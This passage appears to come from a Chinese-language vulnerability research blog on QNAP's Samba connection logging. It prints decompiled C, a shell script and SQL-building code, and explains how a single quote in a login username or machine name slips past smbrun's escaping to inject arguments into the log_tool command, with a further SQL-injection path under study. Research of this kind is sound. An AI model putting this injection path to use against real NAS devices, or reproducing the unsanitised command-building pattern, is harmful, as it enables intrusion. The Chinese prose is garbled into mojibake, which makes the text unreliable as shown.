class="line">    v3 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = data[v3];</span><br><span class="line">        <span class="keyword">if</span> ( (v7 - <span class="number">45</span>) &gt; <span class="number">0x4D</span>u || v7 == <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v4 = (v7 - <span class="number">59</span>) &lt;= <span class="number">5u</span> || v7 == <span class="string">&#x27;[&#x27;</span>;</span><br><span class="line">        v5 = !v4 &amp;&amp; (v7 - <span class="number">93</span>) &gt; <span class="number">1u</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v5 || v7 == <span class="string">&#x27;`&#x27;</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( result &lt;= ++v3 )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">      data[v3++] = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( result &gt; v3 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_A920</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">int</span> log_type,</span></span><br><span class="line"><span class="params">        _BYTE *a2,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> *a3,</span></span><br><span class="line"><span class="params">        _BYTE *remote_machine_name,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> action_type,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> *append)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v12; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v13; <span class="comment">// x20</span></span><br><span class="line">  __int64 v14; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *computer_name; <span class="comment">// x22</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *log_bin; <span class="comment">// x3</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *user; <span class="comment">// x5</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *IP; <span class="comment">// x6</span></span><br><span class="line">  __int64 v20; <span class="comment">// x0</span></span><br><span class="line">  __int64 v21; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">char</span> v22[<span class="number">2048</span>]; <span class="comment">// [xsp+78h] [xbp+58h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="keyword">sizeof</span>(v22));</span><br><span class="line">  <span class="keyword">if</span> ( a2 &amp;&amp; *a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = _talloc_tos(<span class="string">&quot;../../source3/smbd/qnap_conn_log.c:104&quot;</span>);</span><br><span class="line">    v13 = talloc_strdup(v20, a2);</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = _talloc_tos(<span class="string">&quot;../../source3/smbd/qnap_conn_log.c:101&quot;</span>);</span><br><span class="line">  v13 = talloc_strdup(v12, <span class="string">&quot;Unknown&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v13 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">LABEL_4:</span><br><span class="line">  <span class="keyword">if</span> ( action_type == <span class="number">9</span> )</span><br><span class="line">    cmd_filter(v13);</span><br><span class="line">  <span class="keyword">if</span> ( remote_machine_name &amp;&amp; *remote_machine_name )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = _talloc_tos(<span class="string">&quot;../../source3/smbd/qnap_conn_log.c:119&quot;</span>);</span><br><span class="line">    computer_name = talloc_strdup(v21, remote_machine_name);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = _talloc_tos(<span class="string">&quot;../../source3/smbd/qnap_conn_log.c:116&quot;</span>);</span><br><span class="line">    computer_name = talloc_strdup(v14, <span class="string">&quot;Unknown&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( computer_name )</span><br><span class="line">  &#123;</span><br><span class="line">    cmd_filter(computer_name);</span><br><span class="line">    <span class="keyword">if</span> ( action_type == <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      log_bin = <span class="string">&quot;/usr/local/samba/sbin/log_ratelimit.sh&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v13 == <span class="string">&#x27;\\&#x27;</span> )</span><br><span class="line">        user = v13 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        user = v13;</span><br><span class="line">      <span class="keyword">if</span> ( a3 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      log_bin = <span class="string">&quot;/sbin/conn_log_tool&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v13 == <span class="number">92</span> )</span><br><span class="line">        user = v13 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        user = v13;</span><br><span class="line">      <span class="keyword">if</span> ( a3 )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_15:</span><br><span class="line">        IP = a3;</span><br><span class="line">LABEL_16:</span><br><span class="line">        <span class="built_in">snprintf</span>(</span><br><span class="line">          v22,</span><br><span class="line">          <span class="number">0x800</span>uLL,</span><br><span class="line">          <span class="string">&quot;%s -t %d -u &#x27;%s&#x27; -p &#x27;%s&#x27; -m &#x27;%s&#x27; -i %d -n %d -a &#x27;%s&#x27; -S&quot;</span>,</span><br><span class="line">          log_bin,</span><br><span class="line">          log_type,</span><br><span class="line">          user,</span><br><span class="line">          IP,</span><br><span class="line">          computer_name,</span><br><span class="line">          <span class="number">1</span>,</span><br><span class="line">          action_type,</span><br><span class="line">          append);</span><br><span class="line">        smbrun();</span><br><span class="line">        _talloc_free(v13, <span class="string">&quot;../../source3/smbd/qnap_conn_log.c:143&quot;</span>);</span><br><span class="line">        _talloc_free(computer_name, <span class="string">&quot;../../source3/smbd/qnap_conn_log.c:144&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    IP = <span class="string">&quot;0.0.0.0&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line">  _talloc_free(v13, <span class="string">&quot;../../source3/smbd/qnap_conn_log.c:122&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥è®°å½•ç™»å½•æ—¥å¿—çš„ï¼Œå½“ SMB æœåŠ¡æ”¶åˆ°ä¸€æ¬¡è®¤è¯è¯·æ±‚ï¼ŒæˆåŠŸæˆ–å¤±è´¥ï¼Œéƒ½ä¼šè°ƒç”¨æ­¤å‡½æ•°å‘ç³»ç»Ÿ Log æ•°æ®åº“æ’å…¥ä¸€æ¡ä¿¡æ¯ï¼Œè¿™æ¡ä¿¡æ¯åŒ…æ‹¬æ—¶é—´ã€ç™»å½•ç”¨æˆ·ã€å®¢æˆ·ç«¯åç§°ç­‰ã€‚åœ¨æ—§ç‰ˆä¸­ï¼Œä»£ç è·å–äº†å¿…è¦å‚æ•°ä¹‹åï¼Œç›´æ¥å°†å®ƒä»¬æ‹¼æ¥åˆ°å‘½ä»¤ä¸­ï¼Œå¹¶ä½¿ç”¨ smbrun å‡½æ•°æ‰§è¡Œã€‚è€Œæ–°ç‰ˆåœ¨æ‹¼æ¥å‘½ä»¤ä¹‹å‰å¯¹ç›¸å…³å‚æ•°è¿›è¡Œäº†éªŒè¯ï¼Œå°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦æ›¿æ¢ä¸ºæ˜Ÿå·ã€‚</p>
<p>smbrun æ˜¯ Samba å†…ç½®çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥å®‰å…¨çš„æ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/****************************************************************************</span></span><br><span class="line"><span class="comment"> By default this now sanitizes shell expansion.</span></span><br><span class="line"><span class="comment">****************************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">smbrun</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmd, <span class="type">int</span> *outfd, <span class="type">char</span> * <span class="type">const</span> *env)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> smbrun_internal(cmd, outfd, <span class="literal">true</span>, env);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">smbrun_internal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmd, <span class="type">int</span> *outfd, <span class="type">bool</span> sanitize,</span></span><br><span class="line"><span class="params">	<span class="type">char</span> * <span class="type">const</span> *env)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* close all other file descriptors, leaving only 0, 1 and 2. 0 and</span></span><br><span class="line"><span class="comment">	   2 point to /dev/null from the startup code */</span></span><br><span class="line">	closefrom(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">char</span> *newcmd = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">if</span> (sanitize) &#123;</span><br><span class="line">			newcmd = escape_shell_string(cmd);</span><br><span class="line">			<span class="keyword">if</span> (!newcmd)</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">82</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (env != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			execle(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,</span><br><span class="line">				newcmd ? (<span class="type">const</span> <span class="type">char</span> *)newcmd : cmd, <span class="literal">NULL</span>,</span><br><span class="line">				env);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			execl(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,</span><br><span class="line">				newcmd ? (<span class="type">const</span> <span class="type">char</span> *)newcmd : cmd, <span class="literal">NULL</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		SAFE_FREE(newcmd);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* not reached */</span></span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">83</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é»˜è®¤æƒ…å†µä¸‹ sanitize å‚æ•°ä¸º trueï¼Œå‡½æ•°ä¼šè°ƒç”¨ <code>escape_shell_string</code> å»è¿‡æ»¤å‘½ä»¤ï¼Œå°†ä¸€äº›å±é™©å­—ç¬¦ä½¿ç”¨åæ–œæ è½¬ä¹‰ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥æ³¨å…¥æ–°çš„å‘½ä»¤ã€‚ä½† smbrun ä¸ä¼šè½¬ä¹‰å•å¼•å·ç­‰å­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¸€äº›åŒ…å«å•å¼•å·çš„æ•°æ®ï¼Œå°†å‘½ä»¤ä¸­åŸæœ¬çš„å¼•å·é—­åˆï¼Œè¿™æ ·å°±èƒ½æ§åˆ¶åç»­æ‰§è¡Œç¨‹åºçš„å‚æ•°ï¼Œå®ç°å‚æ•°æ³¨å…¥ã€‚</p>
<p>é€šè¿‡è°ƒè¯•åˆ†æå‘ç°ï¼Œå‘é€ä¸€æ¡ SMB ç™»å½•è¯·æ±‚ä¼šæ‰§è¡Œ <code>/usr/local/samba/sbin/log_ratelimit.sh</code> è„šæœ¬</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If ratelimit is turn-off, simply send to Qulog and early exit.</span></span><br><span class="line">ratelimit_bool=<span class="string">&quot;`/sbin/getcfg Samba &quot;</span>ratelimit bool<span class="string">&quot; -d &quot;</span>TRUE<span class="string">&quot; -u`&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;x<span class="variable">$&#123;ratelimit_bool&#125;</span>&quot;</span> != <span class="string">&quot;xTRUE&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">	/sbin/conn_log_tool <span class="variable">$@</span></span><br><span class="line">	<span class="built_in">exit</span> <span class="string">&quot;$?&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get ratelimit seconds. default 3 seconds.</span></span><br><span class="line">ratelimit_sec=<span class="string">&quot;`/sbin/getcfg Samba &quot;</span>ratelimit sec<span class="string">&quot; -d &quot;</span>3<span class="string">&quot; -u`&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Init defaults.</span></span><br><span class="line">ret=0        <span class="comment"># return value</span></span><br><span class="line">argv=<span class="string">&quot;<span class="variable">$@</span>&quot;</span>    <span class="comment"># all arguments.  </span></span><br><span class="line">ip=          <span class="comment"># ip address.</span></span><br><span class="line">machine=     <span class="comment"># computer name.</span></span><br><span class="line">username=    <span class="comment"># username. (might contain domain or workgroup)</span></span><br><span class="line">dummy=       <span class="comment"># dummy arguments saved here for debug.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Parse arguments and get client info.</span></span><br><span class="line">POSITIONAL_ARGS=()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [[ <span class="variable">$#</span> -gt 0 ]]; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">    -p)</span><br><span class="line">      ip=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past argument</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past value</span></span><br><span class="line">      ;;</span><br><span class="line">    -m)</span><br><span class="line">      computer=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past argument</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past value</span></span><br><span class="line">      ;;</span><br><span class="line">    -u)</span><br><span class="line">      <span class="comment"># If username&#x27;s prefix contains domain as &#x27;&lt;DOMAIN&gt;\&lt;USER&gt;&#x27;,</span></span><br><span class="line">      <span class="comment"># replace backslash as semicolon, as &#x27;&lt;DOMAIN&gt;:&lt;USER&gt;&#x27; for valid grep.</span></span><br><span class="line">      username=`<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$2</span>&quot;</span> | sed <span class="string">&#x27;s/\\\\/:/g&#x27;</span> 2&gt;/dev/null`</span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past argument</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past value</span></span><br><span class="line">      ;;</span><br><span class="line">    -*)</span><br><span class="line">      <span class="comment"># echo &quot;Unknown option $1&quot;</span></span><br><span class="line">      <span class="comment"># exit 1</span></span><br><span class="line">      dummy=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past argument</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past value</span></span><br><span class="line">      ;;</span><br><span class="line">    *)</span><br><span class="line">      POSITIONAL_ARGS+=(<span class="string">&quot;<span class="variable">$1</span>&quot;</span>) <span class="comment"># save positional arg</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past argument</span></span><br><span class="line">      ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate keyword from client info.</span></span><br><span class="line">keyword=<span class="string">&quot;<span class="variable">$&#123;username&#125;</span>:<span class="variable">$&#123;ip&#125;</span>:<span class="variable">$&#123;computer&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DEBUG.</span></span><br><span class="line"><span class="comment">#echo $&#123;keyword&#125; &gt;&gt; /tmp/samba_log_ratelimit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Lookup. Bypass if the same log is sent.</span></span><br><span class="line"><span class="keyword">for</span> pid <span class="keyword">in</span> `pidof <span class="built_in">sleep</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="comment"># Check keyword, case insensitive.</span></span><br><span class="line">  grep -i <span class="string">&quot;CMD=<span class="variable">$&#123;keyword&#125;</span>&quot;</span> /proc/<span class="string">&quot;<span class="variable">$&#123;pid&#125;</span>&quot;</span>/environ 2&gt;&amp;1 &gt;/dev/null</span><br><span class="line">  <span class="keyword">if</span> [ x$? == x0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># Found the same log is sent. Bypass.</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Send to Qulog. Insert a record for lookup. Run in background to avoid blocking parent.</span></span><br><span class="line">(/sbin/conn_log_tool <span class="variable">$argv</span> &amp;&amp; CMD=<span class="string">&quot;<span class="variable">$&#123;keyword&#125;</span>&quot;</span> <span class="built_in">sleep</span> <span class="string">&quot;<span class="variable">$&#123;ratelimit_sec&#125;</span>&quot;</span>) &amp;</span><br><span class="line">ret=<span class="string">&quot;$?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> <span class="string">&quot;<span class="variable">$&#123;ret&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>å®é™…ä¸Šæœ€åä¹Ÿæ˜¯æ‰§è¡Œ <code>/sbin/conn_log_tool</code>ï¼Œè„šæœ¬åªæ˜¯ä¸ºäº†é™åˆ¶å‘é€æ—¥å¿—çš„é¢‘ç‡ã€‚æ‰§è¡Œçš„å‘½ä»¤æ¨¡å¼ä¸º</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">/usr/local/samba/sbin/log_ratelimit.sh -t 1 -u <span class="string">&#x27;&lt;ç”¨æˆ·å&gt;&#x27;</span> -p <span class="string">&#x27;&lt;å®¢æˆ·ç«¯ IP åœ°å€&gt;&#x27;</span> -m <span class="string">&#x27;&lt;å®¢æˆ·ç«¯ä¸»æœºå&gt;&#x27;</span> -i 1 -n 9 -a <span class="string">&#x27;---&#x27;</span> -S</span><br></pre></td></tr></table></figure></div>

<p><code>/sbin/conn_log_tool</code> æ˜¯æŒ‡å‘ <code>/sbin/log_tool</code> çš„ç¬¦å·é“¾æ¥ï¼Œåˆ†æ <code>log_tool</code> ç¨‹åºï¼Œå®ƒä¼šè·å–ä¸€ç³»åˆ—å‚æ•°ï¼Œå½“åŒ…å« <code>-a</code> å‚æ•°æ—¶ï¼Œä¼šæ‰§è¡Œä»¥ä¸‹ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( append == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(v77, <span class="number">0</span>, <span class="keyword">sizeof</span>(v77));</span><br><span class="line">  *&amp;v77[<span class="number">4</span>] = qword_41A560;</span><br><span class="line">  <span class="keyword">if</span> ( qword_41A568 )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;v77[<span class="number">64</span>], qword_41A568, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( qword_41A570 )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;v77[<span class="number">129</span>], qword_41A570, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( qword_41A578 )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;v77[<span class="number">194</span>], qword_41A578, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( qword_41A5C0 )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;v77[<span class="number">1556</span>], qword_41A5C0, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( qword_41A5C8 )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;v77[<span class="number">1621</span>], qword_41A5C8, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( qword_41A5D0 )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;v77[<span class="number">1750</span>], qword_41A5D0, <span class="number">0xFF</span>uLL);</span><br><span class="line">  <span class="built_in">strncpy</span>(&amp;v77[<span class="number">259</span>], qword_41A558, <span class="number">0x400</span>uLL);</span><br><span class="line">  *&amp;v77[<span class="number">1284</span>] = dword_41A580;</span><br><span class="line">  *&amp;v77[<span class="number">1288</span>] = dword_41A584;</span><br><span class="line">  *&amp;v77[<span class="number">1552</span>] = qword_41A5B8;</span><br><span class="line">  <span class="keyword">if</span> ( append_msg )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;v77[<span class="number">1292</span>], append_msg, <span class="number">0x100</span>uLL);    <span class="comment">// [1]</span></span><br><span class="line">  <span class="keyword">if</span> ( verbose )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Appending a log to database...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( log_engine == <span class="number">1</span> )                          <span class="comment">// [2]</span></span><br><span class="line">  &#123;</span><br><span class="line">    v66 = &amp;v77[<span class="number">1750</span>];</span><br><span class="line">    v67 = &amp;v77[<span class="number">259</span>];</span><br><span class="line">    v64 = &amp;v77[<span class="number">1556</span>];</span><br><span class="line">    v65 = &amp;v77[<span class="number">1621</span>];</span><br><span class="line">    v22 = SendConnToLogEngineEx4();               <span class="comment">// [3]</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v22 = (naslog_conn_add2)(v77);                <span class="comment">// [4]</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !verbose )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>åœ¨ <code>[1]</code> å¤„ï¼Œåˆ¤æ–­æ˜¯å¦ä¼ å…¥äº† <code>-A</code> å‚æ•°ï¼Œå¦‚æœæ˜¯ï¼Œå°±æŠŠè¿™ä¸ªå‚æ•°å€¼ä¿å­˜åˆ°ç»“æ„ä½“ v77 ä¸­ã€‚åœ¨ <code>[2]</code> å¤„ï¼Œåˆ¤æ–­æ˜¯å¦ä¼ å…¥äº† <code>-S</code> å‚æ•°ï¼Œæ ¹æ®å‰é¢çš„å‘½ä»¤æ¨¡å¼çŸ¥é“æ­£å¸¸æƒ…å†µä¸‹ä¼šè¿›å…¥è¿™ä¸ª if æ¡ä»¶ï¼Œä»è€Œæ‰§è¡Œ <code>SendConnToLogEngineEx4</code> å‡½æ•°ã€‚</p>
<p><code>SendConnToLogEngineEx4</code> è°ƒç”¨ msgsnd å‘æ¶ˆæ¯é˜Ÿåˆ—å‘é€ä¸€æ¡æ¶ˆæ¯ï¼Œæœ€ç»ˆä¼šç”± qLogEngined è¿›ç¨‹æ¥å¤„ç†ï¼Œè§‚å¯Ÿåˆ°å®ƒä¼šè°ƒç”¨ <code>naslog_conn_add_entries2</code> å‘æ•°æ®åº“æ·»åŠ æ•°æ®ï¼Œè¿™ä¸ªå‡½æ•°å®šä¹‰åœ¨ <code>libuLinux_naslog.so.2.0.0</code> ä¸­</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="built_in">memcpy</span>(</span><br><span class="line">    v29,</span><br><span class="line">    <span class="string">&quot;INSERT INTO NASLOG_CONN ( conn_type, conn_date, conn_time, conn_user, conn_ip, conn_comp, conn_res, conn_serv, conn_&quot;</span></span><br><span class="line">    <span class="string">&quot;action, conn_app, conn_action_result, conn_client_id, conn_client_app, conn_client_agent ) VALUES ( ?, strftime(&#x27;%Y-&quot;</span></span><br><span class="line">    <span class="string">&quot;%m-%d&#x27;, CURRENT_TIMESTAMP, &#x27;LOCALTIME&#x27;), strftime(&#x27;%H:%M:%S&#x27;, CURRENT_TIMESTAMP, &#x27;LOCALTIME&#x27;), ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ? );&quot;</span>,</span><br><span class="line">    <span class="number">0x16A</span>uLL);</span><br><span class="line">v6 = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( sqlite3_open(<span class="string">&quot;/etc/logs/conn.log&quot;</span>, &amp;v27) )</span><br><span class="line"><span class="keyword">return</span> <span class="number">4294967276LL</span>;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">sqlite3_busy_timeout(v27, <span class="number">20000LL</span>);</span><br><span class="line"><span class="keyword">if</span> ( !sqlite3_prepare(v27, v29, <span class="number">0xFFFFFFFF</span>LL, &amp;v28, <span class="number">0LL</span>) &amp;&amp; !sqlite3_exec(v27, <span class="string">&quot;BEGIN TRANSACTION;&quot;</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">sqlite3_close(v27);</span><br><span class="line"><span class="keyword">if</span> ( v6 == <span class="number">6</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967267LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( v6 )</span><br><span class="line">&#123;</span><br><span class="line">  ++v6;</span><br><span class="line">  unlink(<span class="string">&quot;/etc/logs/conn.log&quot;</span>);</span><br><span class="line">  naslog_conn_create_tbl(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  ++v6;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( sqlite3_open(<span class="string">&quot;/etc/logs/conn.log&quot;</span>, &amp;v27) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967276LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>ä½†æ˜¯è¿™ä¸ªå‡½æ•°æ‹¼æ¥ SQL è¯­å¥æ—¶ä½¿ç”¨äº†é¢„ç¼–è¯‘ï¼Œæ— æ³•è¿›è¡Œ SQL æ³¨å…¥ï¼Œå› æ­¤æ¼æ´ç‚¹å¯èƒ½ä¸åœ¨è¿™ä¸€æ¡è·¯å¾„ä¸Šé¢ã€‚</p>
<p>å›åˆ° <code>log_tool</code> ä¸­ï¼Œå½“æ²¡æœ‰ä¼ å…¥ <code>-S</code> å‚æ•°æ—¶ï¼Œä»£ç ä¼šåœ¨ <code>[4]</code> å¤„è°ƒç”¨ <code>naslog_conn_add2</code>ï¼Œè¿™ä¸ªå‡½æ•°ä¹Ÿä½äº <code>libuLinux_naslog.so.2.0.0</code> ä¸­</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">v14 = sqlite3_mprintf(</span><br><span class="line">  <span class="string">&quot;INSERT INTO NASLOG_CONN \t( conn_type, conn_user, conn_ip, conn_comp, conn_res, conn_serv, conn_action, conn_a&quot;</span></span><br><span class="line">  <span class="string">&quot;pp, conn_action_result, conn_client_id, conn_client_app, conn_client_agent ) \tVALUES \t( %d, &#x27;%s&#x27;, &#x27;%s&#x27;, &#x27;%s&#x27;&quot;</span></span><br><span class="line">  <span class="string">&quot;, &#x27;%s&#x27;, %d, %d, &#x27;%s&#x27;, %d, %Q, %Q, %Q);&quot;</span>,</span><br><span class="line">  v11,</span><br><span class="line">  v1,</span><br><span class="line">  a1 + <span class="number">129</span>,</span><br><span class="line">  a1 + <span class="number">194</span>,</span><br><span class="line">  v78,</span><br><span class="line">  v12,</span><br><span class="line">  v13,</span><br><span class="line">  v56,</span><br><span class="line">  v57,</span><br><span class="line">  v58,</span><br><span class="line">  v59,</span><br><span class="line">  v60);</span><br><span class="line"><span class="keyword">if</span> ( sqlite3_open(<span class="string">&quot;/etc/logs/conn.log&quot;</span>, &amp;v65) )</span><br><span class="line">&#123;</span><br><span class="line">sqlite3_free(v14);</span><br><span 